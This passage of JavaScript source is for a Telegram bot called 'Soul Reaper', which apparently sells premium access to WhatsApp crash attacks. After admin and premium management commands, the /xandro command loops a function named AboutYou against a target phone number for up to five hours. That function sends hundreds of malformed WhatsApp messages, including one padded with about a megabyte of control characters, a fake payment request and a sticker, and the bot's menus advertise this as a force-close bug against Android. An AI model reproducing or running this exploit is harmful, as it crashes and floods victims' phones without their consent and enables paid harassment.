                        userInfo = `- *Username:* ${username ? '@' + username : 'Tidak ada'}\n- *Nama:* ${firstName || 'Tidak diketahui'}\n`;
                }
                const successMessage = `
 ╭═══════『 𝐀𝐝𝐦𝐢𝐧 𝐀𝐝𝐝𝐞𝐝 』═══════⊱
 │
 ├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
 │ - *ID:* ${userId}
 ${userInfo}│ - *Status:* Admin Active ✅
 │
 ├─────『 𝐀𝐜𝐜𝐞𝐬𝐬 』
 │ • /addprem command
 │ • /delprem command
 │ • Premium management
 │
 ╰═════════════════════⊱`;
                await ctx.replyWithMarkdown(successMessage, {
                        reply_markup: {
                                inline_keyboard: [
                                        [{
                                                text: "📋 ADMIN LIST",
                                                callback_data: "listadmin"
                                        }]
                                ]
                        }
                });
        } catch (error) {
                console.error("Error in addadmin:", error);
                await ctx.reply("❌ Terjadi kesalahan saat menambahkan admin. Silakan coba lagi.");
        }
});
bot.command("deladmin", async (ctx) => {
        if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
                return;
        }
        const userId = ctx.message.text.split(" ")[1];
        if (!userId) {
                return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
        }
        removeAdmin(userId);
        const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.
*Detail:*
- *ID User:* ${userId}
Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;
        await ctx.replyWithMarkdown(successMessage, {
                reply_markup: {
                        inline_keyboard: [
                                [{
                                        text: "ℹ️ Daftar Admin",
                                        callback_data: "listadmin"
                                }]
                        ]
                }
        });
});
bot.action("listadmin", async (ctx) => {
        if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
                return;
        }
        const adminListString = adminList.length > 0 ?
                adminList.map(id => `- ${id}`).join("\n") :
                "Tidak ada admin yang terdaftar.";
        const message = `
ℹ️ Daftar Admin:
${adminListString}
Total: ${adminList.length} admin.
    `;
        await ctx.answerCbQuery();
        await ctx.replyWithMarkdown(message);
});
bot.command("addprem", async (ctx) => {
        await ctx.telegram.sendChatAction(ctx.chat.id, 'choose_sticker');
        if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
                await ctx.telegram.sendSticker(ctx.chat.id, 'CAACAgUAAxkBAAEN_wJnybiE8RG94Zq1x_I3NlVwremwZwACdwMAAhU0uFUVapiCmjNu3DYE', {
                        reply_to_message_id: ctx.message.message_id
                });
        }
        let userId, durationDays;
        const args = ctx.message.text.split(" ");
        if (ctx.message.reply_to_message) {
                userId = ctx.message.reply_to_message.from.id.toString();
                durationDays = parseInt(args[1]);
                if (!durationDays || isNaN(durationDays) || durationDays <= 0) {
                        return await ctx.reply("❌ Format perintah salah.\n\nGunakan:\n- Reply: /addprem <durasi_hari>\n- Manual: /addprem <id_user> <durasi_hari>");
                }
        } else {
                if (args.length < 3) {
                        return await ctx.reply("❌ Format perintah salah.\n\nGunakan:\n- Reply: /addprem <durasi_hari>\n- Manual: /addprem <id_user> <durasi_hari>");
                }
                userId = args[1];
                durationDays = parseInt(args[2]);
                if (isNaN(durationDays) || durationDays <= 0) {
                        return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
                }
        }
        try {
                addPremiumUser(userId, durationDays);
                const expirationDate = premiumUsers[userId].expired;
                const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss')
                        .tz('Asia/Jakarta')
                        .format('DD-MM-YYYY HH:mm:ss');
                let userInfo = "";
                if (ctx.message.reply_to_message) {
                        const username = ctx.message.reply_to_message.from.username;
                        const firstName = ctx.message.reply_to_message.from.first_name;
                        userInfo = `- *Username:* ${username ? '@' + username : 'Tidak ada'}\n- *Nama:* ${firstName || 'Tidak diketahui'}\n`;
                }
                const successMessage = `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 』═══════⊱
│
├─────『 𝐔𝐬𝐞𝐫 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ - *ID User:* ${userId}
${userInfo}│ - *Status:* Premium Active ✅
│ - *Durasi:* ${durationDays} hari
│ - *Expired:* ${formattedExpiration} WIB
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Akses ke semua fitur premium
│ • Priority support
│ • Unlimited penggunaan
│
╰═════════════════════⊱
`;
                await ctx.replyWithMarkdown(successMessage, {
                        reply_markup: {
                                inline_keyboard: [
                                        [{
                                                text: "📊 Cek Status Premium",
                                                callback_data: `cekprem_${userId}`
                                        }],
                                        [{
                                                text: "📚 Panduan Premium",
                                                callback_data: `premium_guide`
                                        }]
                                ]
                        },
                        reply_to_message_id: ctx.message.message_id
                });
        } catch (error) {
                console.error("Error in addprem:", error);
                await ctx.reply("❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.");
        }
});
bot.command("delprem", async (ctx) => {
        await ctx.telegram.sendChatAction(ctx.chat.id, 'choose_sticker');
        if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
                await ctx.telegram.sendSticker(ctx.chat.id, 'CAACAgUAAxkBAAEODo9n0ChtIFw4aeY8nOWm4BrF1fbthgAC7AYAAoNJ-VUl9_10WPFNjzYE', {
                        reply_to_message_id: ctx.message.message_id
                });
        }
        const userId = ctx.message.text.split(" ")[1];
        if (!userId) {
                return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
        }
        if (!premiumUsers[userId]) {
                return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
        }
        removePremiumUser(userId);
        const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.
*Detail:*
- *ID User:* ${userId}
User tersebut tidak lagi memiliki akses ke fitur premium.
    `;
        await ctx.replyWithMarkdown(successMessage);
});
bot.action(/cekprem_(.+)/, async (ctx) => {
        const userId = ctx.match[1];
        if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
                return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
        }
        if (!premiumUsers[userId]) {
                return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
        }
        const expirationDate = premiumUsers[userId].expired;
        const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
        const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();
        const message = `
ℹ️ Status Premium User *${userId}*
*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}
Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;
        await ctx.answerCbQuery();
        await ctx.replyWithMarkdown(message);
});
bot.command("cekusersc", async (ctx) => {
        const totalDevices = deviceList.length;
        const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;
        await ctx.replyWithMarkdown(deviceMessage);
});
bot.command("monitoruser", async (ctx) => {
        if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
                return;
        }
        let userList = "";
        for (const userId in userActivity) {
                const user = userActivity[userId];
                userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
        }
        const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;
        await ctx.replyWithMarkdown(message);
});
const prosesrespone = async (target, ctx) => {
        const processMessage = `
╔══════════════════
║ 🎯TARGET: +${target.split('@')[0]}
║ ⚔️ STATUS: proses...
╚══════════════════`;
        try {
                await ctx.reply(processMessage);
        } catch (error) {
                console.error('Process error:', error);
        }
};
const donerespone = async (target, ctx) => {
        const successMessage = `
╔══════════════════ 
║ 🎯 TARGET: +${target.split('@')[0]}
║ ✨ STATUS: ATTACK SUCCESS
╚══════════════════`;
        try {
                await ctx.reply(successMessage);
        } catch (error) {
                console.error('Response error:', error);
        }
};
const checkWhatsAppConnection = async (ctx, next) => {
        if (!isWhatsAppConnected) {
                await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
                return;
        }
        await next();
};
bot.use(checkMaintenance); 
function formatPhoneNumber(number) {
        let cleaned = number.replace(/[^0-9]/g, '');
        cleaned = cleaned.replace(/^\+/, '');
        if (cleaned.startsWith('0')) {
                cleaned = '62' + cleaned.slice(1);
        }
        if (!cleaned.startsWith('62')) {
                cleaned = '62' + cleaned;
        }
        return cleaned;
}
function formatPhoneNumber(number) {
        let cleaned = number.replace(/[^0-9]/g, '');
        cleaned = cleaned.replace(/^\+/, '');
        if (cleaned.startsWith('0')) {
                cleaned = '62' + cleaned.slice(1);
        }
        if (!cleaned.startsWith('62')) {
                cleaned = '62' + cleaned;
        }
        return cleaned;
}
function formatPhoneNumber(number) {
        let cleaned = number.replace(/[^0-9]/g, '');
        cleaned = cleaned.replace(/^\+/, '');
        if (cleaned.startsWith('0')) {
                cleaned = '62' + cleaned.slice(1);
        }
        if (!cleaned.startsWith('62')) {
                cleaned = '62' + cleaned;
        }
        return cleaned;
}
bot.command("xandro", checkWhatsAppConnection, checkPremium, async ctx => {
        await ctx.telegram.sendChatAction(ctx.chat.id, 'record_audio');
        const userId = ctx.from.id;
        const cooldownStatus = checkCooldown(userId);
        if (!cooldownStatus.canAttack) {
                return await ctx.reply(`
╭═══════『 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 』═══════⊱
│
│ • Status: Masih Cooldown ⏳
│ • Tunggu: ${cooldownStatus.remainingTime} detik lagi
│
╰═════════════════════⊱`);
        }
        const args = ctx.message.text.split(/\s+/);
        if (args.length < 3) {
                return await ctx.reply(`
╭═══════⟨ 𝐂𝐚??𝐚 𝐏𝐚𝐤𝐞 ⟩━━━━━━━╮
│
│ • /xandro 628xxx 1m   (1 menit)
│ • /xandro 628xxx 1j   (1 jam)
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support 0/62/+62
│ • Max durasi: 5 jam (5j)
│ • Jeda per pesan: 3 detik
│
╰═════════════════════⊱`, {
                        reply_to_message_id: ctx.message.message_id
                });
        }
        const nomorHP = args[1];
        const durationInput = args[2].toLowerCase();
        let durationMs = 0;
        if (durationInput.endsWith('m')) {
                const minutes = parseInt(durationInput.replace('m', ''));
                if (isNaN(minutes) || minutes < 1) return await ctx.reply("❌ Menit tidak valid!");
                durationMs = minutes * 60 * 1000;
        } else if (durationInput.endsWith('j')) {
                const hours = parseInt(durationInput.replace('j', ''));
                if (isNaN(hours) || hours < 1) return await ctx.reply("❌ Jam tidak valid!");
                if (hours > 5) return await ctx.reply("❌ Maksimal durasi adalah 5 jam!");
                durationMs = hours * 60 * 60 * 1000;
        } else {
                return await ctx.reply("❌ Format waktu salah! Gunakan 'm' untuk menit atau 'j' untuk jam (contoh: 1m atau 1j)");
        }
        const nomorFix = formatPhoneNumber(nomorHP);
        let target = nomorFix + "@s.whatsapp.net";
        await prosesrespone(target, ctx);
        userLastAttack.set(userId, Date.now());
        const runAttack = async () => {
                const endTime = Date.now() + durationMs;
                while (Date.now() < endTime) {
                        if (!isWhatsAppConnected) break;
                        await AboutYou(target);
                        await sleep(3000);
                }
                await donerespone(target, ctx);
        };
        runAttack();
});
bot.start(async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, "typing");
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  const NgentodEnak = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│⚡ *𝐂𝐫𝐞𝐚𝐭𝐨𝐫*: @zihardev
│🚀 *𝐕𝐞𝐫𝐬𝐢𝐨𝐧*: 1
│⭐ *𝐀𝐝𝐦𝐢𝐧*: ${isAdminStatus ? "✅" : "❌"}
│💎 *𝐏𝐫𝐞𝐦𝐢𝐮𝐦*: ${isPremium ? "✅" : "❌"}
│👑 *𝐎𝐰𝐧𝐞𝐫*: ${isOwnerStatus ? "✅" : "❌"}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘 ! @zihardev
`;
  const videoUrl = ""; 
  const imageUrl = "https://files.catbox.moe/rn570i.jpg";
  const keyboard = [
    [
      { text: "📱 MENU DEV", callback_data: "soultampleng" },
      { text: "🐞 MENU", callback_data: "bugmen" },
      { text: "👑 ADM MENU", callback_data: "ulznxx" },
      { text: "SI GANTENG CIHUY", url: "https://t.me/zihardev" },
    ],
  ];
  try {
    if (!videoUrl) throw new Error("videoUrl empty");
    await ctx.replyWithVideo(videoUrl, {
      caption: NgentodEnak,
      reply_markup: { inline_keyboard: keyboard },
      reply_to_message_id: ctx.message.message_id,
    });
  } catch (error) {
    await ctx.replyWithPhoto(imageUrl, {
      caption: NgentodEnak,
      reply_markup: { inline_keyboard: keyboard },
      reply_to_message_id: ctx.message.message_id,
    });
  }
});
bot.action('soultampleng', async (ctx) => {
        ctx.answerCbQuery();
        const menu = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
│◈ /addadmin  »  System Admin Control
│◈ /deladmin  »  Remove Admin Access  
│◈ /cekusersc »  System Usage Monitor
│◈ /monitoruser » User Activity Track
│◈ /addpairing » Connect WhatsApp
│◈ /maintenance » System Lock
│◈ /removeallbot » Remove Bot / Sender
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
        const keyboard = [
                [{
                        text: "RESELLER",
                        url: "https://t.me/zihardev"
                }]
        ];
        await ctx.editMessageCaption(menu, {
                parse_mode: "Markdown",
                reply_markup: {
                        inline_keyboard: keyboard
                }
        });
});
bot.action('ulznxx', async (ctx) => {
        ctx.answerCbQuery();
        const ULZZZZZZZZZZ = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
│◈/addprem  »  Grant Premium Power
│◈/delprem  »  Revoke Premium Access
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
        const keyboard = [
                [{
                        text: "RESELLER",
                        url: "https://t.me/zihardev"
                }]
        ];
        await ctx.editMessageCaption(ULZZZZZZZZZZ, {
                parse_mode: "Markdown",
                reply_markup: {
                        inline_keyboard: keyboard
                }
        });
});
bot.action('bugmen', async (ctx) => {
        const isPremium = isPremiumUser(ctx.from.id);
        const isAdminStatus = isAdmin(ctx.from.id);
        const isOwnerStatus = isOwner(ctx.from.id);
        const Zee = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
├─────⟨ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 ⟩
│ • /xandro ⚡
│   ├ Tipe: Fc All andro( Not Prema)
│   ├ Target: All Android
│   └ Status: Perfect Hit ✅
│
│ • /soulz 🔥 
│   ├ Tipe: Fc All andro( Not Prema)
│   ├ Target: Android Latest
│   └ Status: Working ✅
│
├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
│ • Premium: ${isPremium ? '✅ Active' : '❌ Not Active'}
│ • Cooldown: ${bugCooldown} detik
├─────『 𝐈𝐍𝐅𝐎 』
│
│ • Metode: Durasi (m/j)
│ • Jeda: 3 Detik
│ • Max: 5 Jam
│ • Premium only commands
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
        const keyboard = [
                [{
                        text: "RESELLER",
                        url: "https://t.me/zihardev"
                }],
                [{
                        text: "💎 PREMIUM ACCESS",
                        callback_data: "premiuminfo"
                }]
        ];
        await ctx.editMessageCaption(Zee, {
                parse_mode: "Markdown",
                reply_markup: {
                        inline_keyboard: keyboard
                }
        });
});
bot.command('bugmen', async (ctx) => {
        const isPremium = isPremiumUser(ctx.from.id);
        const isAdminStatus = isAdmin(ctx.from.id);
        const isOwnerStatus = isOwner(ctx.from.id);
        const imageUrl2 = "https://files.catbox.moe/rn570i.jpg";
        const Zee1 = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
├─────⟨ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 ⟩
│ • /xandro ⚡
│   ├ Tipe: Fc All andro( Not Prema)
│   ├ Target: All Android
│   └ Status: Perfect Hit ✅
│
├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
│ • Premium: ${isPremium ? '✅ Active' : '❌ Not Active'}
│ • Cooldown: ${bugCooldown} detik
├─────『 𝐈𝐍𝐅𝐎 』
│
│ • Metode: Durasi (m/j)
│ • Jeda: 3 Detik
│ • Max: 5 Jam
│ • Premium only commands
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
        const keyboard = [
                [{
                        text: "RESELLER",
                        url: "https://t.me/zihardev"
                }],
                [{
                        text: "💎 PREMIUM ACCESS",
                        callback_data: "premiuminfo"
                }]
        ];
        await ctx.replyWithPhoto(imageUrl2, {
                caption: Zee1,
                reply_markup: {
                        inline_keyboard: keyboard
                },
                reply_to_message_id: ctx.message.message_id
        });
});
async function clearChat(target) {
        try {
                const targetJid = targetNumber.includes("@s.whatsapp.net") ?
                        targetNumber :
                        `${target}@s.whatsapp.net`;
                const chats = bydaah.chats.get(targetJid);
                if (!chats) {
                        console.log("Target chat tidak ditemukan!");
                        return;
                }
                await bydaah.modifyChat(targetJid, "delete");
                console.log(`Semua pesan dengan ${target} telah dihapus.`);
        } catch (error) {
                console.error("Gagal menghapus chat:", error);
        }
}
async function AboutYou(target, ptcp = true) {
    for (let i = 0; i < 888; i++) {
        try {
            const msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "./#",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\x10".repeat(1045000),
                                version: 3,
                            },
                            entryPointConversionSource: "galaxy_message",
                        }
                    }
                }
            }, {
                ephemeralExpiration: 0,
                forwardingScore: 9741,
                isForwarded: true,
                font: Math.floor(Math.random() * 99999999),
                background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
            });
            await bydaah.relayMessage(target, {
                groupStatusMessageV2: {
                    message: msg.message,
                },
            }, ptcp ? {
                messageId: msg.key.id,
                participant: { jid: target },
            } : { messageId: msg.key.id });
            const paymentMsg = {
                viewOnceMessage: {
                    message: {
                        requestPaymentMessage: {
                            body: {
                                text: "./$",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "review_and_pay",
                                paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                                version: 3
                            }
                        }
                    }
                }
            };
            await bydaah.relayMessage(target, paymentMsg, {
                groupId: null,
                participant: { jid: target }
            });
            const stickerMsg = {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "fxxvVtTCmZ2Bpm/GEYpFF2GKUzJ8wWVrGY1mCmmh4I4=",
                    fileEncSha256: "3xsWx0Y/1pNbWXWh/OG2mt4Ld0FEug25kyZ+lC+UbV4=",
                    mediaKey: "uHEU7OghGYVW7IcWjhNlxPeZHNS0qfphvRUcy6+22wo=",
                    mimetype: "image/webp",
                    height: 64,
                    width: 64,
                    directPath: "/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0",
                    fileLength: "13862",
                    mediaKeyTimestamp: "1763628089",
                    isAnimated: false
                }
            };
            await bydaah.relayMessage(target, stickerMsg);
            await sleep(1000);
        } catch (error) {}
    }
}
bot.launch({ dropPendingUpdates: true })
    .then(() => {
        console.log("𝕾𝖔𝖚𝖑 𝖛𝟙 𝖌𝖊𝖓𝟚 | @bydaa");
    })
    .catch((err) => {
        console.error("Error starting bot:", err);
        setTimeout(() => process.exit(1), 5000);
    });
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));